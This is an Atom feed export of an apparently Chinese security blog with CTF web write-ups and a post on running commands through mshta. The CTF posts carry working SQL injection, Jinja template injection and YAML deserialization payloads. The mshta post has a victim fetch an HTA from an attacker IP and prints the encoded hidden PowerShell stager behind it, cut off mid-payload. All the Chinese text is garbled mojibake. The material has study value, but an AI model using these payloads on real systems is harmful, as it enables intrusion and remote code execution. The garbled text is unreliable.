<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrilic&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://patrilic.top/"/>
  <updated>2019-06-14T07:08:50.940Z</updated>
  <id>http://patrilic.top/</id>
  
  <author>
    <name>Patrilic</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCN2019-Ë•øÂçóËµõÂå∫ÈÉ®ÂàÜWebÈ¢òËß£</title>
    <link href="http://patrilic.top/2019/06/10/CISCN2019-%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%83%A8%E5%88%86Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://patrilic.top/2019/06/10/CISCN2019-Ë•øÂçóËµõÂå∫ÈÉ®ÂàÜWebÈ¢òËß£/</id>
    <published>2019-06-10T07:08:02.000Z</published>
    <updated>2019-06-14T07:08:50.940Z</updated>
    
    <content type="html"><![CDATA[<p>P1g3ÊàòÈòü<br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/931F982B33E8B1040822716BDAFA42EE.jpg" alt="931f982b33e8b1040822716bdafa42ee"></p><h2 id="Ciscn-q07"><a href="#Ciscn-q07" class="headerlink" title="Ciscn-q07"></a>Ciscn-q07</h2><p>ÂÖàÊ≥®ÂÜå‰∏Ä‰∏™admin‚Äô# ÁöÑË¥¶Âè∑ÁÑ∂ÂêéÁõ¥Êé•Êñá‰ª∂‰∏ä‰º†<br>Áõ¥Êé•‰º†php(‰∏çÁî®&lt;?php)<br>Êîπmime‰∏∫image/jpegÂ∞±getshell‰∫Ü..<br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/071.png" alt="4d80f49d47825ccd9aca1330a124636c"><br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/072.png" alt="913690845a8e92d1ab10a77737894477"></p><p>Âà§ÂÆö‰∫Ü‰∏Ä‰∏™adminÁöÑÊùÉÈôê</p><h2 id="Ciscn-q09"><a href="#Ciscn-q09" class="headerlink" title="Ciscn-q09"></a>Ciscn-q09</h2><p>Ê≥®ÂÜåÁî®Êà∑ÁôªÈôÜÁöÑÊó∂ÂÄôÔºåÂèëÁé∞Â≠òÂú®sqlÊ≥®ÂÖ•<br>ÁôªÈôÜËøõÂéª‰πãÂêéÂèëÁé∞Ê≥®ÈáäÊúâÊèêÁ§∫ÔºåÂ≠òÂú®adminÁöÑË¥¶Âè∑ÔºåÊ≥®ÂÜå‰∏Ä‰∏™Áî®Êà∑Âêç‰∏∫‰∏ãÈù¢ÁöÑË¥¶Âè∑ÔºåÁôªÈôÜÂç≥ÂèØÊ≥®ÂÖ•adminÁöÑÂØÜÁ†Å<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;&amp;amp;&amp;amp;¬†extractvalue(1,concat(0x7e,(select¬†`3`¬†from¬†(select¬†1,2,3¬†union¬†select¬†*¬†from¬†user)a¬†limit¬†1,1)))#</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/091.png" alt="19cd6150c405f77f4e70098b9a9ff4f7"><br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/092.png" alt="f94276c29af45e7fc2928bcbe9248541"><br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/093.png" alt="86a8390a6baa79d4ccaa682ae02d91cb"></p><p>Áî®adminÁöÑË¥¶Âè∑ÂíåÂØÜÁ†ÅÁôªÈôÜÊèêÁ§∫orangeÁöÑSSRFÔºåÂèØÊéßurlÂ∞±ÊòØbugÂèçÈ¶à</p><p>Êê∫Â∏¶cookieÂéªËØ∑Ê±Çflag.phpÂç≥ÂèØËé∑Âæóflag<br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/094.png" alt="9142fc4e44be8a5d61cde6519fdbf26e"></p><h2 id="Ciscn-8"><a href="#Ciscn-8" class="headerlink" title="Ciscn 8"></a>Ciscn 8</h2><p>URLÔºö172.16.9.18<br>ÁúãÁùÄÊúâËÆ°ÁÆóÂäüËÉΩÔºåÂπ∂‰∏îÊòØPYÔºåÁõ¥Êé•ÊÉ≥SSTIÔºåËØï‰∫Ü‰∏ã 2<br>ÂæóÂà∞ËæìÂá∫ÁªìÊûú‰∏∫2ÔºåÁ°ÆÂÆö‰∫ÜSSTI<br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/123.png" alt="3a65fa54c411da804acc98652f208834"></p><p>ÁÑ∂ÂêéÂ∞±ÊòØÁî®payload‰∫ÜÔºå‰∏çËøáÊµãËØïËøáÁ®ã‰∏≠ÂèëÁé∞‰∫Ü‰∏§‰∏™ËøáÊª§ÁöÑÁÇπ ‰∏Ä‰∏™ÊòØÊã¨Âè∑Ôºå‰∏Ä‰∏™ÊòØopenÂ≠óÁ¨¶‰∏≤Ôºå‰∏çËøáÈÉΩÂèØ‰ª•Áî®ÂèåÂÜôÊù•ÁªïËøá Êã¨Âè∑Âè™ÊòØÂçïÁã¨ÁöÑÊã¨Âè∑Â∞±‰ºöË¢´ÁΩÆÊç¢‰∏∫Á©∫ÔºåÂ¶ÇÊûúÈáåÈù¢ÊúâÂ≠óÁ¨¶ÁöÑËØùÂ∞±‰∏ç‰ºöÁΩÆÊç¢‰∏∫Á©∫ ÊØîÂ¶Ç () Ë¶ÅÁî® (()) ÁªïÔºå open Ë¶ÅÁî® opopenen Áªï<br>‰∫éÊòØÊúÄÁªàÁöÑpayload‰∏∫<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/111.png" alt="4ef955d4f8a6198ac47c9f39365b480c"><br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/112.png" alt="65c4176a3f67c25b3beafaad2432027a"></p><h2 id="Ciscn-10"><a href="#Ciscn-10" class="headerlink" title="Ciscn 10"></a>Ciscn 10</h2><p>URLÔºö 172.16.9.20<br>ÁÇπÂáªÂøòËÆ∞ÂØÜÁ†Å<br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/3.png" alt="454b911c60722c999e150395e4fbcbab"></p><p>‰øÆÊîπÂêéÂèØÁõ¥Êé•ÁôªÂΩïadmin<br><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/ÂõæÁâá 2.png" alt="5ce1c580d29d7c882b2e34f59ff2885f"></p><p>ÁåúÊµãyamlÂëΩ‰ª§ÊâßË°å<br>ÊâßË°ålsÁªìÊûú<br> PayloadÔºö<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!map &#123;</span><br><span class="line">? !!str¬†&quot;goodbye&quot;</span><br><span class="line">: !!python/object/apply:subprocess.check_output [</span><br><span class="line">!!str¬†&quot;ls&quot;,],&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/ÂõæÁâá 1.png" alt="1349a5aa45787c9df811b7ae787084f4"></p><p>ÂáÜÂ§áÊûÑÈÄ†payload ËøõË°åcat /flagÊó∂ÂèëÁé∞Âà´‰∫∫‰∏ä‰º†‰∫Ü5.yml<br>Áõ¥Êé•ËÆøÈóÆÂç≥ÂèØÔºö<br> flag{81595b84-317b-434a-b45f-6aea2c37722c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;P1g3ÊàòÈòü&lt;br&gt;&lt;img src=&quot;/CISCN2019 -Ë•øÂçóËµõÂå∫ÂàÜÂå∫ËµõWebÈ¢òËß£.resources/931F982B33E8B1040822716BDAFA42EE.jpg&quot; alt=&quot;931f982b33e8b1040822716bdafa42ee&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ</title>
    <link href="http://patrilic.top/2019/06/05/QWB2019%20Web%20-%E9%9A%8F%E4%BE%BF%E6%B3%A8%EF%BC%88%E9%A2%98%E8%A7%A3%EF%BC%89/"/>
    <id>http://patrilic.top/2019/06/05/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ/</id>
    <published>2019-06-05T12:59:32.000Z</published>
    <updated>2019-07-08T15:50:31.719Z</updated>
    
    <content type="html"><![CDATA[<p>Á¨¨‰∏ÄÊ¨°ÈÅáÂà∞‰ΩøÁî® <strong>mysqli_multi_query()</strong> ÁöÑÈ¢òÁõÆÔºåÂÅö‰∏™ËÆ∞ÂΩï</p><p>Ê¶ÇÁéáËÆ∫‰ΩøÊàëÊÜîÊÇ¥</p><h2 id="0x01-ÊÄùË∑Ø"><a href="#0x01-ÊÄùË∑Ø" class="headerlink" title="0x01 ÊÄùË∑Ø"></a>0x01 ÊÄùË∑Ø</h2><p>ÊâìÂºÄÈ¢òÁõÆÔºåÂ∞±‰∏Ä‰∏™&lt;input>Ê†áÁ≠æÔºåÈöè‰æøËæì‰∏Ä‰∏™Êï∞Â≠óÔºåburpÊäì‰∏Ä‰∏ã<br><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/225795EF-A32C-497C-967D-C6AED199E73A.png" alt="a9bba15b8d47ba4edea294709f323bc5"></p><p>ÊÑüËßâÊòØ‰∏ÄËà¨ÁöÑselectËØ≠Âè•<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">data</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span> = &#123;$inject&#125;</span><br></pre></td></tr></table></figure></p><p>Êµã‰∏Ä‰∏ãËøáÊª§ÊÉÖÂÜµ<br>Èöè‰æøËæìÂÖ•‰∏Ä‰∏™<img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/893B07F7-8A30-4FBD-923D-3203BF85F508.png" alt="0535bce1ced6095c073ded1c06110095"><br>ÁàÜÂá∫ËøáÊª§ÊÉÖÂÜµ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure></p><p>Â∞ùËØï‰∏ÄÊ≥¢extractvalue(),Êó†Êûú..</p><p>ÁÑ∂ÂêéÂ∞±Âú®ÊµãËØï‰∏Ä‰∫õÂ∏∏Áî®ÁöÑÊÉÖÂÜµÔºåÁ±ª‰ºº‰∫é<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((substr(user(),1,1)&gt;'a'),sleep(5),1);</span><br></pre></td></tr></table></figure></p><p>ÂêéÊù•@hpdogerÂëäËØâÊàëËØ¥ÂèØ‰ª•Â†ÜÂè†Êü•ËØ¢..<br>‰∫éÊòØ‰πé..<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/C6C08A11-B19B-49EC-AECC-E88D6846C07A.png" alt="e77b6cef87b97ccf9d695c4f36dd2fe2"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/F4ECA2ED-A838-4A75-BA6B-5ED93136DB3E.png" alt="acde9a6b7ba360dbb9e0404f47a48a1c"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">describe</span><span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/B102EE66-34F1-4FB9-8098-65E35EB32CA3.png" alt="6bcd5a04abba3759bc0d190a82b550ce"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'version'</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/5F55DDD1-4E28-46C6-8EE2-B3F9C8C8F00A.png" alt="9a2a58383e535d53cc886c3078bfbe33"></p><p>ÊâÄ‰ª•Áé∞Âú®ÁöÑ‰ø°ÊÅØÂ∞±ÊòØ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: supersqli</span><br><span class="line">table: 1919810931114514</span><br><span class="line">column: flag</span><br><span class="line">version: 10.0.27-MariaDB-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure></p><p>ÁÑ∂ÂêéËøòÊúâ‰∏™Â•ΩÁé©ÁöÑÔºö<br>Êü•ÁúãgrantÁöÑÊó∂ÂÄô: ;SHOW GRANTS FOR CURRENT_USER()<br><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/BD7CB99F-9E59-45B0-9AF7-1AE8E74158DC.png" alt="f7c19dd203bc1755b0d46759e09f93c7"></p><p>Áé∞Âú®ÁõÆÊ†áÊòéÁ°ÆÔºåÂ∞±ÊòØË¶Å<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="number">191981093111414</span></span><br></pre></td></tr></table></figure></p><h2 id="ÊñπÊ≥ï1"><a href="#ÊñπÊ≥ï1" class="headerlink" title="ÊñπÊ≥ï1"></a>ÊñπÊ≥ï1</h2><p>Âà©Áî®setÂ∞Ü<strong>select flag from 1919810931114514</strong>ÂÜôÂÖ•ÂèòÈáè@patrilic‰∏≠ÔºåÂà©Áî®prepareÂ∞ÜÂèòÈáèËÆæÁΩÆ‰∏∫È¢ÑÂ§ÑÁêÜÔºåÁÑ∂ÂêéÂÜçexecute</p><p>‰∏ªË¶ÅÂèØ‰ª•bypassÊéâselectÔºåÁî®char()ÂáΩÊï∞Â∏¶ÂÖ•„ÄÇ<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @patrilic=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">32</span>),<span class="number">1919810931114514</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/868A3AB6-CFD4-4B93-8ACF-7FD92F44A6C6.png" alt="f30557894cf438c4e47146a0cb3bbc45"></p><p>ÁÑ∂ÂêéÁõ¥Êé•ÊâßË°åÂç≥ÂèØ.<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23</span><br></pre></td></tr></table></figure></p><p>ÂèÇËÄÉ:<br><a href="https://blog.csdn.net/qq_42030417/article/details/80372800" target="_blank" rel="noopener">https://blog.csdn.net/qq_42030417/article/details/80372800</a></p><h2 id="ÊñπÊ≥ï2"><a href="#ÊñπÊ≥ï2" class="headerlink" title="ÊñπÊ≥ï2"></a>ÊñπÊ≥ï2</h2><p>Âà©Áî®mysql::handler<br><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/44DCE71B-290D-4DF1-BF78-8CA825633D9F.png" alt="078ec36715ece7186ada02a51ac1f367"></p><p>‰πüÂèØ‰ΩøÁî®Âà´Âêç<br><img src="/QWB2019 Web -Èöè‰æøÊ≥®ÔºàÈ¢òËß£Ôºâ.resources/6F664750-5A87-498E-9790-42EC62EAE0F3.png" alt="5e65dda79fc38e997716d9f5139dc88a"></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23</span><br></pre></td></tr></table></figure></p><p>ÂèÇËÄÉÔºö<br><a href="https://dev.mysql.com/doc/refman/5.7/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a><br><a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p><h2 id="ÊñπÊ≥ï3"><a href="#ÊñπÊ≥ï3" class="headerlink" title="ÊñπÊ≥ï3"></a>ÊñπÊ≥ï3</h2><p>‚Ä¶ </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Á¨¨‰∏ÄÊ¨°ÈÅáÂà∞‰ΩøÁî® &lt;strong&gt;mysqli_multi_query()&lt;/strong&gt; ÁöÑÈ¢òÁõÆÔºåÂÅö‰∏™ËÆ∞ÂΩï&lt;/p&gt;
&lt;p&gt;Ê¶ÇÁéáËÆ∫‰ΩøÊàëÊÜîÊÇ¥&lt;/p&gt;
&lt;h2 id=&quot;0x01-ÊÄùË∑Ø&quot;&gt;&lt;a href=&quot;#0x01-ÊÄùË∑Ø&quot; class=&quot;headerlink&quot; title=&quot;0
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Command Execute By mshta</title>
    <link href="http://patrilic.top/2019/05/08/Command%20Execute%20By%20mshta/"/>
    <id>http://patrilic.top/2019/05/08/Command Execute By mshta/</id>
    <published>2019-05-08T03:20:33.000Z</published>
    <updated>2019-07-08T15:43:49.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-mshta"><a href="#0x01-mshta" class="headerlink" title="0x01 mshta"></a>0x01 mshta</h2><p>üëâÂÆòÊñπÊñáÊ°£Áõ¥ÈÄöËΩ¶ ‚Äì&gt;<a href="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5" target="_blank" rel="noopener">üöóÊª¥Êª¥Êª¥</a>)</p><p>ÊÄùË∑ØÔºöÂà©Áî®MshtaÊâßË°åJavaScript/VBscript Ë∞ÉÁî®<strong>WScript.shell</strong>ÊâßË°åÂëΩ‰ª§<br>ÁªìÂêàVBS‰∏ãËΩΩC2 payloadÔºåJS‰∏ãËΩΩpayloadÔºåJSRATÔºåÁõ¥Êé•ÂèçÂºπsession‚Ä¶‚Ä¶<br>eg:<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mshta vbscript:window.execScript("alert('hello world!');","javascript") </span><br><span class="line"></span><br><span class="line">mshta javascript:window.execScript("msgBox('hello world!'):window.close","vbs")</span><br></pre></td></tr></table></figure></p><p>ÊµãËØïÔºö</p><blockquote><p>Attacker : 192.168.199.142 MacOS<br>Victim : 192.168.121.130  Windows 10 1809</p></blockquote><h2 id="0x02-MetaSploit-hta-server"><a href="#0x02-MetaSploit-hta-server" class="headerlink" title="0x02 MetaSploit::hta_server"></a>0x02 MetaSploit::hta_server</h2><p><strong>exploit/windows/misc/hta_server</strong><br><img src="/Command Execute By mshta.resources/D5C323C2-F7B7-4C16-B1AF-3C6529398DFA.png" alt="418b9f4a3fb34ef94542812b0130a9f8"></p><p>ÂèóÂÆ≥Êú∫ÊâßË°å<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">199</span>.<span class="number">142</span>:<span class="number">8080</span>/wSbMp9V.hta</span><br></pre></td></tr></table></figure></p><p>‰ºöË¢´DefenderÊã¶Êà™<br>Ê†∑Êú¨ÂàÜÊûê</p><p><ps1>‰∏∫Base64Âä†ÂØÜÁöÑps1‰ª£Á†Å<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if([IntPtr]::Size -eq 4)&#123;</span><br><span class="line">    $b=&apos;powershell.exe&apos;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $b=$env:windir+&apos;\syswow64\WindowsPowerShell\v1.0\powershell.exe&apos;&#125;;</span><br><span class="line">    $s=New-Object System.Diagnostics.ProcessStartInfo;</span><br><span class="line">    $s.FileName=$b;</span><br><span class="line">    $s.Arguments=&apos;-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;&apos;H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA=&apos;&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;;</span><br><span class="line">    $s.UseShellExecute=$false;</span><br><span class="line">    $s.RedirectStandardOutput=$true;</span><br><span class="line">    $s.WindowStyle=&apos;Hidden&apos;;</span><br><span class="line">    $s.CreateNoWindow=$true;</span><br><span class="line">    $p=[System.Diagnostics.Process]::Start($s);</span><br></pre></td></tr></table></figure></ps1></p><p>Ëß£ÂØÜÂêé<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>([IntPtr]::Size <span class="nomarkup">-eq</span> <span class="number">4</span>)&#123;<span class="variable">$b</span>=<span class="string">'powershell.exe'</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$b</span>=<span class="variable">$env:windir</span>+<span class="string">'\syswow64\WindowsPowerShell\v1.0\powershell.exe'</span>&#125;;<span class="variable">$s</span>=<span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo;<span class="variable">$s</span>.FileName=<span class="variable">$b</span>;<span class="variable">$s</span>.Arguments=<span class="string">'-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('</span><span class="string">'H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe4